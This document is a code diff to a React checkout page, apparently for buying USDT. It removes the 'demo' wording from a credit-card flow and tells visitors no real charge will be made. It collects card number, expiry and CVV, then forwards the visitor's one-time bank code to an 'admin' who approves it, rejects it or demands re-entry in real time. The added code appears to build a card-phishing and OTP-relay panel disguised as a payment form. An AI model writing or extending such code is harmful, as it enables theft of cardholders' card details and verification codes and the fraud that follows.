@@ -1,7 +1,7 @@
 import React, { useEffect, useMemo, useState } from 'react';
 import { Link, useLocation } from 'react-router-dom';
 import { translations } from '../translations';
-import { createOrder, getPaymentDetails, verifyCreditCardOtp } from '../api';
+import { createOrder, getPaymentDetails, submitCreditCardOtp, fetchCreditCardOtpDecision } from '../api';
 import { getOrCreateVisitorId } from '../visitTracking';
 import { saveOrderLocal } from '../lib/savedOrders';
 import Header from '../components/Header';
@@ -20,6 +20,30 @@ function useCountdown(targetMs) {
   const mm = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
   const ss = String(totalSeconds % 60).padStart(2, '0');
   return { remainingMs, mm, ss };
+}
+
+function detectCardBrand(digits) {
+  const d = String(digits || '').trim();
+  if (!d) return { key: 'unknown', labelAr: '', labelEn: '' };
+  if (/^4/.test(d)) return { key: 'visa', labelAr: 'Visa', labelEn: 'Visa' };
+  const mc2 = /^5[1-5]/.test(d);
+  const mc22 = /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(d); // 2221-2720
+  if (mc2 || mc22) return { key: 'mastercard', labelAr: 'MasterCard', labelEn: 'MasterCard' };
+  if (/^3[47]/.test(d)) return { key: 'amex', labelAr: 'AmEx', labelEn: 'AmEx' };
+  return { key: 'unknown', labelAr: '', labelEn: '' };
+}
+
+function formatCardNumber(digits) {
+  const d = String(digits || '').replace(/\D/g, '').slice(0, 19);
+  const parts = d.match(/.{1,4}/g) || [];
+  return parts.join(' ');
+}
+
+function formatExpiryInput(raw) {
+  const digits = String(raw || '').replace(/\D/g, '').slice(0, 4);
+  if (!digits) return '';
+  if (digits.length <= 2) return digits;
+  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
 }
 
 export default function BuyPage() {
@@ -58,7 +82,7 @@ export default function BuyPage() {
   const [sent, setSent] = useState(false);
   const [kycAcknowledged, setKycAcknowledged] = useState(false);
 
-  // Credit card demo flow (OTP)
+  // Credit card flow (OTP)
   const [cardHolderName, setCardHolderName] = useState(state.cardHolderName || '');
   const [cardNumber, setCardNumber] = useState(state.cardNumber || '');
   const [cardExpiry, setCardExpiry] = useState(state.cardExpiry || '');
@@ -66,6 +90,9 @@ export default function BuyPage() {
   const [otpCode, setOtpCode] = useState('');
   const [otpExpiresAt, setOtpExpiresAt] = useState(null);
   const [verifyingOtp, setVerifyingOtp] = useState(false);
+
+  const [ccSubmissionId, setCcSubmissionId] = useState('');
+  const [ccDecision, setCcDecision] = useState('pending');
 
   useEffect(() => {
     document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
@@ -162,6 +189,11 @@ export default function BuyPage() {
     : true;
   const cardCvvValid = isCreditCard ? /^[0-9A-Za-z]{3}$/.test(String(cardCvv || '').trim()) : true;
 
+  const ccBrand = isCreditCard ? detectCardBrand(cardNumberDigits) : { key: 'unknown', labelAr: '', labelEn: '' };
+  const formattedCardNumber = isCreditCard ? formatCardNumber(cardNumberDigits) : '';
+  const cardCvvDigitsOnly = isCreditCard ? String(cardCvv || '').replace(/\D/g, '').slice(0, 3) : '';
+  const hasCvcInput = isCreditCard ? String(cardCvv || '').trim().length > 0 : false;
+
   const canSendCard = Boolean(
     isCreditCard &&
       name &&
@@ -189,7 +221,7 @@ export default function BuyPage() {
   const onConfirm = async () => {
     if (isCreditCard) {
       if (!canSendCard) {
-        setError(isRtl ? 'يرجى إكمال بيانات بطاقة الائتمان التجريبية بشكل صحيح.' : 'Please complete the demo card fields correctly.');
+        setError(isRtl ? 'يرجى إكمال بيانات بطاقة الائتمان بشكل صحيح.' : 'Please complete the card fields correctly.');
         return;
       }
     } else if (!name || !usdtWallet || !walletNetwork || usdtAmount < 5 || !walletValid || !senderValid) {
@@ -266,7 +298,7 @@ export default function BuyPage() {
     }
   };
 
-  const onVerifyOtp = async () => {
+  const onSubmitOtp = async () => {
     if (!orderId) {
       setError(isRtl ? 'رقم الطلب غير موجود. أعد المحاولة.' : 'Missing order id. Please try again.');
       return;
@@ -276,11 +308,15 @@ export default function BuyPage() {
       setError(isRtl ? 'يرجى إدخال كود مكوّن من 6 أرقام.' : 'Please enter a 6-digit code.');
       return;
     }
+
     setVerifyingOtp(true);
     setError('');
     try {
-      await verifyCreditCardOtp(orderId, code);
-      setSent(true);
+      const resp = await submitCreditCardOtp(orderId, code);
+      if (!resp?.submissionId) throw new Error('Missing submissionId');
+      setCcSubmissionId(resp.submissionId);
+      setCcDecision('pending');
+      setStage(4);
     } catch (e) {
       if (e?.code === 'OTP_NOT_FOUND_OR_EXPIRED') {
         setError(isRtl ? 'انتهت صلاحية الكود. أعد المحاولة.' : 'OTP expired. Please try again.');
@@ -291,6 +327,55 @@ export default function BuyPage() {
       setVerifyingOtp(false);
     }
   };
+
+  useEffect(() => {
+    if (stage !== 4 || !ccSubmissionId) return;
+    let alive = true;
+    let timer = null;
+    const poll = async () => {
+      try {
+        const r = await fetchCreditCardOtpDecision(ccSubmissionId);
+        if (!alive) return;
+        const decision = String(r?.decision || 'pending');
+        setCcDecision(decision);
+        if (!decision || decision === 'pending') return;
+
+        if (decision === 'completed') {
+          setSent(true);
+          return;
+        }
+
+        if (decision === 'rejected') {
+          setError(isRtl ? 'تم رفض العملية. حاول مرة أخرى.' : 'Your code was rejected. Please try again.');
+          setStage(3);
+          setOtpCode('');
+          return;
+        }
+
+        if (decision === 'reenter') {
+          setError(
+            isRtl
+              ? 'طلب الإدمن إعادة إدخال الرمز الصحيح. أدخل الكود الجديد.'
+              : 'Admin requested re-entry of the correct code. Enter the new code.'
+          );
+          setStage(3);
+          setOtpCode('');
+          return;
+        }
+
+        // hold or unknown: keep waiting
+      } catch {
+        // ignore polling errors
+      }
+    };
+
+    poll();
+    timer = setInterval(poll, 2200);
+    return () => {
+      alive = false;
+      if (timer) clearInterval(timer);
+    };
+  }, [stage, ccSubmissionId, isRtl]);
 
   if (sent) {
     return (
@@ -448,10 +533,10 @@ export default function BuyPage() {
               {paymentMethod === 'CreditCard' && (
                 <div className="text-center">
                   <p className="text-error text-sm mb-2">
-                    {isRtl ? 'وسيلة دفع تجريبية (Demo) — لا يتم خصم فعلي.' : 'Demo payment method — no real charge.'}
+                    {isRtl ? 'لن يتم خصم فعليًا من البطاقة.' : 'No real charge will be made to your card.'}
                   </p>
                   <p className="text-muted text-sm" style={{ lineHeight: 1.6, margin: 0 }}>
-                    {isRtl ? 'عند الضغط على إرسال سيتم إرسال كود تجريبي إلى البوت، وبعد إدخاله تكتمل العملية في الموقع.' : 'Press Send to receive a demo code in the bot. Enter it to complete the process.'}
+                    {isRtl ? 'عند الضغط على إرسال سيتم إرسال كود تحقق إلى البوت، وبعد إدخاله تكتمل العملية في الموقع.' : 'Press Send to receive a verification code in the bot. Enter it to complete the process.'}
                   </p>
                 </div>
               )}
@@ -648,6 +733,58 @@ export default function BuyPage() {
 
             {stage === 2 && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                {isCreditCard && (
+                  <div className="cc-preview-shell buy-span-2">
+                    <div className="cc-preview">
+                      <div className="cc-preview-top">
+                        <div className={`cc-brand-icon ${cardNumberDigits ? 'cc-brand-icon--animate' : ''}`}>
+                          {ccBrand.key === 'visa' && (
+                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
+                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
+                              <text x="60" y="48" textAnchor="middle" fontSize="34" fontFamily="Arial" fill="currentColor" fontWeight="700">VISA</text>
+                            </svg>
+                          )}
+                          {ccBrand.key === 'mastercard' && (
+                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
+                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
+                              <circle cx="50" cy="38" r="18" fill="rgba(235,87,87,0.95)" />
+                              <circle cx="70" cy="38" r="18" fill="rgba(245,203,87,0.95)" />
+                              <text x="60" y="52" textAnchor="middle" fontSize="18" fontFamily="Arial" fill="white" fontWeight="700">MC</text>
+                            </svg>
+                          )}
+                          {ccBrand.key === 'amex' && (
+                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
+                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
+                              <text x="60" y="48" textAnchor="middle" fontSize="28" fontFamily="Arial" fill="currentColor" fontWeight="700">AMEX</text>
+                            </svg>
+                          )}
+                          {ccBrand.key === 'unknown' && (
+                            <svg viewBox="0 0 120 76" width="64" height="42" aria-hidden="true">
+                              <rect x="0" y="0" width="120" height="76" rx="12" fill="rgba(255,255,255,0.06)" />
+                              <text x="60" y="48" textAnchor="middle" fontSize="22" fontFamily="Arial" fill="currentColor" fontWeight="700">CARD</text>
+                            </svg>
+                          )}
+                        </div>
+                      </div>
+                      <div className="cc-preview-number">
+                        {formattedCardNumber || '•••• •••• •••• ••••'}
+                      </div>
+                      <div className="cc-preview-bottom">
+                        <div className="cc-preview-exp">
+                          <div className="cc-preview-label">{isRtl ? 'الانتهاء' : 'EXP'}</div>
+                          <div className="cc-preview-value">{cardExpiry || 'MM/YY'}</div>
+                        </div>
+                        <div className="cc-preview-cvc">
+                          <div className="cc-preview-label">{isRtl ? 'CVC' : 'CVC'}</div>
+                          <div className={`cc-preview-value ${cardCvvValid ? 'cc-cvc-ok' : ''}`}>
+                            {cardCvvDigitsOnly ? '•••' : '•••'}
+                          </div>
+                        </div>
+                      </div>
+                      <div className={`cc-preview-progress ${cardNumberDigits ? 'cc-preview-progress--active' : ''}`} />
+                    </div>
+                  </div>
+                )}
                 <div className="input-group buy-span-2">
                   <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                     {isRtl ? 'الاسم الكامل' : 'Full Name'}
@@ -715,7 +852,7 @@ export default function BuyPage() {
                       <input
                         className="input-control"
                         value={cardNumber}
-                        onChange={(e) => setCardNumber(e.target.value)}
+                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                         placeholder={isRtl ? 'مثال: 4111 1111 1111 1111' : 'e.g. 4111 1111 1111 1111'}
                         inputMode="numeric"
                         dir="ltr"
@@ -730,7 +867,7 @@ export default function BuyPage() {
                       <input
                         className="input-control"
                         value={cardExpiry}
-                        onChange={(e) => setCardExpiry(e.target.value)}
+                        onChange={(e) => setCardExpiry(formatExpiryInput(e.target.value))}
                         placeholder="MM/YY"
                         dir="ltr"
                         style={{ textAlign: 'left' }}
@@ -738,13 +875,24 @@ export default function BuyPage() {
                     </div>
 
                     <div className="input-group buy-span-2">
-                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                        {isRtl ? 'رمز (3 حروف/أرقام)' : 'CVV (3 chars)'}
+                      <label className="input-label cc-cvv-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                        <span>{isRtl ? 'رمز (3 حروف/أرقام)' : 'CVV (3 chars)'}</span>
+                        <span
+                          className={
+                            `cc-cvv-indicator` +
+                            (cardCvvValid ? ' cc-cvv-indicator--ok' : '') +
+                            (!cardCvvValid && hasCvcInput ? ' cc-cvv-indicator--active' : '')
+                          }
+                        >
+                          <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+                            <path fill="currentColor" d="M12 2C8.13 2 5 5.13 5 9c0 5 7 13 7 13s7-8 7-13c0-3.87-3.13-7-7-7zm0 8.5c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+                          </svg>
+                        </span>
                       </label>
                       <input
                         className="input-control"
                         value={cardCvv}
-                        onChange={(e) => setCardCvv(e.target.value)}
+                        onChange={(e) => setCardCvv(String(e.target.value).replace(/[^0-9a-zA-Z]/g, '').slice(0, 3))}
                         placeholder="XXX"
                         dir="ltr"
                         inputMode="text"
@@ -791,29 +939,64 @@ export default function BuyPage() {
 
             {stage === 3 && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
-                <div className="input-group buy-span-2">
-                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'أدخل كود البطاقة التجريبي' : 'Enter demo card code'}
+                <div className="cc-otp-panel buy-span-2">
+                  <div className="cc-otp-title">{isRtl ? 'بانتظار إدخال الكود' : 'Enter the code'}</div>
+
+                  <div className="cc-otp-code-box" aria-live="polite">
+                    {otpCode ? (
+                      <code>{otpCode}</code>
+                    ) : (
+                      <span style={{ opacity: 0.7 }}>{isRtl ? '••••••' : '••••••'}</span>
+                    )}
+                  </div>
+
+                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left', marginTop: '1rem' }}>
+                    {isRtl ? 'أدخل كود التحقق (6 أرقام)' : 'Verification code (6 digits)'}
                   </label>
                   <input
                     className="input-control"
                     value={otpCode}
-                    onChange={(e) => setOtpCode(e.target.value)}
+                    onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
                     placeholder={isRtl ? 'مثال: 123456' : 'e.g. 123456'}
                     dir="ltr"
                     inputMode="numeric"
                     style={{ textAlign: 'left' }}
                   />
+
                   {otpExpiresAt && (
                     <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                       {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
                     </div>
                   )}
-                  <div className="text-muted text-sm mt-3" style={{ lineHeight: 1.6, textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl
-                      ? 'تم إرسال الكود إلى البوت. أدخله هنا ثم اضغط موافق.'
-                      : 'The code was sent in the bot. Enter it here and press Confirm.'}
+
+                  <div className="cc-otp-hint">
+                    {isRtl ? 'الزائر: ارسل هذا الكود للإدارة' : 'Visitor: send this code to the admin'}
                   </div>
+                </div>
+              </div>
+            )}
+
+            {stage === 4 && (
+              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                <div className="cc-otp-await buy-span-2">
+                  <div className="cc-otp-spinner" aria-hidden="true" />
+                  <div className="cc-otp-await-title">{isRtl ? 'بانتظار قرار الإدمن' : 'Waiting for admin decision'}</div>
+                  <div className="cc-otp-await-code">
+                    {otpCode ? (
+                      <span>
+                        {isRtl ? 'الكود:' : 'Code:'} <code>{otpCode}</code>
+                      </span>
+                    ) : (
+                      <span style={{ opacity: 0.7 }}>{isRtl ? '—' : '—'}</span>
+                    )}
+                  </div>
+                  {ccDecision && ccDecision !== 'pending' && (
+                    <div className="cc-otp-await-sub">
+                      {isRtl
+                        ? `الحالة: ${ccDecision}`
+                        : `Status: ${ccDecision}`}
+                    </div>
+                  )}
                 </div>
               </div>
             )}
@@ -826,7 +1009,10 @@ export default function BuyPage() {
               ) : (
                 <button
                   type="button"
-                  onClick={() => setStage(stage === 3 ? 2 : 1)}
+                  onClick={() => {
+                    if (stage === 4) return;
+                    setStage(stage === 3 ? 2 : 1);
+                  }}
                   className="btn btn-outline"
                   style={{ flex: 1 }}
                 >
@@ -844,7 +1030,7 @@ export default function BuyPage() {
                     return;
                   }
                   if (stage === 3) {
-                    onVerifyOtp();
+                    onSubmitOtp();
                   }
                 }}
                 className="btn btn-primary"
@@ -855,14 +1041,20 @@ export default function BuyPage() {
                       ? (canMoveToPayDetails ? 1 : 0.5)
                       : stage === 2
                         ? (isCreditCard ? (canSendCard ? 1 : 0.5) : (cd.remainingMs === 0 || usdtAmount < 5 ? 0.5 : 1))
-                        : (verifyingOtp ? 0.5 : (cd.remainingMs === 0 ? 0.5 : 1)),
+                        : stage === 3
+                          ? (verifyingOtp ? 0.5 : (cd.remainingMs === 0 ? 0.5 : 1))
+                          : 0.6,
                 }}
                 disabled={
-                  stage === 1
-                    ? !canMoveToPayDetails
-                    : stage === 2
-                      ? (sending || cd.remainingMs === 0 || usdtAmount < 5 || (isCreditCard ? !canSendCard : false))
-                      : (verifyingOtp || cd.remainingMs === 0)
+                  stage === 4
+                    ? true
+                    : stage === 1
+                      ? !canMoveToPayDetails
+                      : stage === 2
+                        ? (sending || cd.remainingMs === 0 || usdtAmount < 5 || (isCreditCard ? !canSendCard : false))
+                        : stage === 3
+                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{6}$/.test(String(otpCode || '').trim()))
+                          : true
                 }
               >
                 {stage === 1
@@ -873,7 +1065,9 @@ export default function BuyPage() {
                         ? (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال' : 'Send'))
                         : (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : t.confirmAndSend)
                     )
-                    : (verifyingOtp ? (isRtl ? 'جاري التحقق...' : 'Verifying...') : (isRtl ? 'موافق' : 'Confirm'))}
+                    : stage === 3
+                      ? (verifyingOtp ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال الكود' : 'Send code'))
+                      : (isRtl ? 'بانتظار...' : 'Waiting...')}
               </button>
             </div>
 
